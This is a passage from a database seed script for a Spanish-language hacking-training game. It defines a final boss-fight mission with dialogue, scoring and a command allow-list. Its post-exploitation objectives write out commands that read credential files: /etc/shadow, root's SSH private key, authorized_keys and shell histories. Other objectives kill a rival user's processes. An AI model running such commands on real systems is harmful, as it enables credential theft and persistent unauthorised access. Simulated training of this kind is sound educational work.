        tutorialDialogue: {
          onSuccess: [
            { character: 'ZERO', text: 'root confirmado. UID=0. Victoria total.', mood: 'triumphant' },
            { character: 'BOSS', text: 'Root. El control absoluto.', mood: 'satisfied' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // FASE 4: POST-EXPLOTACIÓN (OPCIONALES)
      // ══════════════════════════════════════════════════════
      {
        code: 'READ_SHADOW_FILE',
        description: '[OPCIONAL] Extrae los hashes de passwords',
        hint: 'cat /etc/shadow como root',
        commands: ['cat /etc/shadow'],
        traceImpact: 5,
        category: 'post-exploitation',
        isOptional: true,
        bonusXp: 50,
        tutorialDialogue: {
          onSuccess: [
            { character: 'SALLY', text: 'Hashes de password extraídos. Podrías crackearlos offline.', mood: 'success' }
          ]
        }
      },
      {
        code: 'CHECK_SSH_KEYS',
        description: '[OPCIONAL] Busca llaves SSH para persistencia',
        hint: 'cat /root/.ssh/id_rsa',
        commands: [
          'cat /root/.ssh/id_rsa',
          'ls -la /root/.ssh/',
          'cat /root/.ssh/authorized_keys'
        ],
        traceImpact: 8,
        category: 'post-exploitation',
        isOptional: true,
        bonusXp: 75,
        tutorialDialogue: {
          onSuccess: [
            { character: 'SALLY', text: 'Llave privada SSH de root. Acceso permanente asegurado.', mood: 'impressed' }
          ]
        }
      },
      {
        code: 'READ_ADMIN_HISTORY',
        description: '[SECRETO] Lee el historial de comandos del admin',
        hint: 'cat /home/admin/.bash_history',
        commands: [
          'cat /home/admin/.bash_history',
          'cat /root/.bash_history'
        ],
        traceImpact: 10,
        category: 'post-exploitation',
        isHidden: true,
        bonusXp: 100,
        tutorialDialogue: {
          onSuccess: [
            { character: 'SALLY', text: '¡Jackpot! El admin dejó credenciales en texto plano.', mood: 'amazed' },
            { character: 'SALLY', text: 'Password de producción: Pr0d_S3rv3r_2024!', mood: 'triumphant' },
            { character: 'BOSS', text: 'Eso nos abre puertas a otros sistemas.', mood: 'calculating' }
          ]
        }
      },
      {
        code: 'SABOTAGE_VIPER',
        description: '[PVP] Sabotea la sesión de VIPER',
        hint: 'Encuentra su proceso y termínalo',
        commands: [
          'ps aux | grep viper',
          'kill -9 $(pgrep -u viper)',
          'pkill -u viper'
        ],
        traceImpact: 30,
        category: 'pvp',
        isOptional: true,
        bonusXp: 150,
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Puedes sabotear a VIPER... pero es arriesgado.', mood: 'warning' },
            { character: 'SALLY', text: 'Si lo haces, su reputación caerá pero la tuya también.', mood: 'serious' }
          ],
          onSuccess: [
            { character: 'VIPER', text: '¿¡QUÉ!? ¿Me mataste la sesión? ¡ESTO NO QUEDARÁ ASÍ!', mood: 'enraged' },
            { character: 'BOSS', text: 'Hmm. Tácticas sucias. Efectivas, pero sucias.', mood: 'amused' },
            { character: 'ZERO', text: 'Cuidado, Shadow. Te has ganado un enemigo.', mood: 'warning' }
          ]
        }
      }
    ],
    
    objectives: [],
    
    tracebackConfig: { 
      maxTrace: 100, 
      warningThreshold: 80,
      sessionVariables: {
        username: 'shadow',
        hostname: 'battleground',
        target_ip: '192.168.100.50',
        local_ip: '192.168.100.10',
        viper_pid: '1337',
        admin_user: 'admin',
        currentDirectory: '~'
      },
      competitionMode: true,
      viperProgress: {
        enabled: true,
        speedFactor: 0.85,
        catchUpEnabled: true
      },
      // Eventos narrativos de competencia
      competitionEvents: [
        {
          triggerObjective: 'CHECK_SUDO_PERMISSIONS',
          viperDialogue: [
            { character: 'VIPER', text: 'Encontré lo mismo. Vamos empatados.', mood: 'competitive' }
          ]
        },
        {
          playerLagging: true,
          threshold: 60,
          dialogue: [
            { character: 'VIPER', text: '¿Te estás durmiendo? Ya casi tengo root.', mood: 'mocking' },
            { character: 'SALLY', text: '¡Shadow, acelera! VIPER te está ganando.', mood: 'urgent' }
          ]
        },
        {
          playerAhead: true,
          threshold: 40,
          dialogue: [
            { character: 'VIPER', text: 'Maldición... ¿cómo vas tan rápido?', mood: 'frustrated' },
            { character: 'BOSS', text: 'Impresionante ritmo, Shadow.', mood: 'impressed' }
          ]
        }
      ]
    },
    
    allowedCommands: [
      'whoami', 'id', 'sudo', 'su',
      'find', 'locate', 'which', 'whereis',
      'cat', 'less', 'head', 'tail', 'grep',
      'ls', 'cd', 'pwd',
      'ps', 'pgrep', 'pkill', 'kill', 'top',
      'python', 'python3', 'perl', 'ruby',
      'bash', 'sh', 'dash',
      'chmod', 'chown',
      'crontab', 'at',
      'nc', 'netcat',
      'ssh', 'scp',
      'echo', 'printf',
      'clear', 'help'
    ],
    
    requiredNodeNumber: 5,
    
    introDialog: [
      { character: 'BOSS', text: 'Shadow Hunter. Has llegado lejos.', mood: 'neutral' },
      { character: 'BOSS', text: 'Pero alguien cuestiona tu progreso.', mood: 'serious' },
      { character: 'VIPER', text: '¡YO! Estoy harto de que te lleves el crédito.', mood: 'aggressive' },
      { character: 'VIPER', text: 'He estado en SirTech más tiempo. SOY MEJOR.', mood: 'arrogant' },
      { character: 'BOSS', text: 'Muy bien. Lo resolveremos aquí y ahora.', mood: 'cold' },
      { character: 'BOSS', text: 'Un servidor. Dos operativos. El primero en root gana.', mood: 'calculating' },
      { character: 'SALLY', text: 'Shadow, VIPER es rápido. No lo subestimes.', mood: 'worried' },
      { character: 'ZERO', text: 'Recuerda todo lo que has aprendido. Confío en ti.', mood: 'encouraging' },
      { character: 'VIPER', text: '¿Listo para perder, novato? ¡QUE EMPIECE!', mood: 'excited' }
    ],
    
    outroDialogSuccess: [
      { character: 'ZERO', text: '🏆 ¡VICTORIA! Shadow Hunter obtiene root primero.', mood: 'triumphant' },
      { character: 'VIPER', text: '...No puede ser. ¡NO PUEDE SER!', mood: 'devastated' },
      { character: 'BOSS', text: 'El resultado es claro. Shadow Hunter es superior.', mood: 'satisfied' },
      { character: 'VIPER', text: 'Esto... esto no termina aquí. Te arrepentirás.', mood: 'threatening' },
      { character: 'SALLY', text: 'Lo lograste, Shadow. Has demostrado tu valor.', mood: 'proud' },
      { character: 'ZERO', text: 'Desde el Protocolo Génesis hasta derrotar a VIPER...', mood: 'nostalgic' },
      { character: 'ZERO', text: 'Has recorrido un largo camino, Shadow Hunter.', mood: 'proud' },
      { character: 'BOSS', text: 'Bienvenido al círculo interno de SirTech.', mood: 'formal' },
      { character: 'BOSS', text: 'Tu verdadero trabajo... acaba de comenzar.', mood: 'ominous' }
    ],
    
    outroDialogFailure: [
      { character: 'VIPER', text: '¡SÍ! ¡ROOT ES MÍO! ¿Quién es el novato ahora?', mood: 'triumphant' },
      { character: 'VIPER', text: 'Jajaja. Sabía que no estabas a mi nivel.', mood: 'mocking' },
      { character: 'BOSS', text: 'Decepcionante, Shadow Hunter.', mood: 'disappointed' },
      { character: 'SALLY', text: 'No te rindas. Puedes intentarlo de nuevo.', mood: 'supportive' },
      { character: 'ZERO', text: 'La derrota es maestra. Aprende de ella.', mood: 'wise' }
    ]
  },
});

// ═════════════════════════════════════════════════════════
// ACTUALIZAR PROGRESO DEL USUARIO
// ═════════════════════════════════════════════════════════
console.log('📊 Inicializando progreso del usuario Beta...');

const allMissions = [mission0, mission1, mission2, mission3, mission4, mission5, mission6];

for (const mission of allMissions) {
  await prisma.missionProgress.create({
    data: {
      userId: testUser.id,
      missionId: mission.id,
      isCompleted: false,
      isInProgress: false,
      attempts: 0,
      bestTime: null,
      bestTrace: 100,
    },
  });
}

console.log(`✅ Progreso inicializado para ${allMissions.length} misiones.\n`);

// ═════════════════════════════════════════════════════════
// RESUMEN FINAL
// ═════════════════════════════════════════════════════════
console.log('═══════════════════════════════════════════════════════════════');
console.log('                    🎉 SEED COMPLETADO 🎉');
console.log('═══════════════════════════════════════════════════════════════');
console.log(`📧 Email: ${testUser.email}`);
console.log(`🔑 Password: shadow2025`);
console.log(`🎯 Misiones: ${allMissions.length}`);
console.log('');
console.log('📋 ARCO 1: EL DESPERTAR');
console.log('───────────────────────────────────────────────────────────────');
console.log('   M0: Protocolo Génesis       [TUTORIAL]  - Comandos básicos');
console.log('   M1: Sombra Digital          [EASY]      - Reconocimiento red');
console.log('   M2: Infiltración Básica     [EASY]      - Navegación sistema');
console.log('   M3: Fuga de Datos           [MEDIUM]    - Exfiltración + Timer');
console.log('   M4: Interceptación Señales  [MEDIUM]    - Análisis tráfico (NUEVA)');
console.log('   M5: Dominio Oscuro          [HARD]      - Active Directory (MEJORADA)');
console.log('   M6: El Punto de Quiebre     [EXPERT]    - Boss Fight vs VIPER');
console.log('───────────────────────────────────────────────────────────────');
console.log('');
console.log('📈 CURVA DE APRENDIZAJE:');
console.log('   M0-M2: Fundamentos Linux (whoami, ls, cd, find, cat)');
console.log('   M3:    Operaciones bajo presión (cp, scp, rm, timer)');
console.log('   M4:    Análisis de red (tcpdump, netstat, lsof, strings)');
console.log('   M5:    Ataques Windows/AD (nmap, impacket, crackmapexec)');
console.log('   M6:    Privesc Linux + competencia (sudo, SUID, exploits)');
console.log('');
console.log('🎭 NARRATIVA:');
console.log('   - VIPER aparece desde M1, intensifica en M5, clímax en M6');
console.log('   - Dilemas éticos en M4 (reportar vs chantajear)');
console.log('   - Foreshadowing de BlackSphere conecta M4 → M5');
console.log('   - Eventos de detección con probabilidad en M5');
console.log('');
console.log('═══════════════════════════════════════════════════════════════\n');

}

main()
  .catch((e) => {
    console.error('\n❌ ERROR EN SEED BETA:', e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });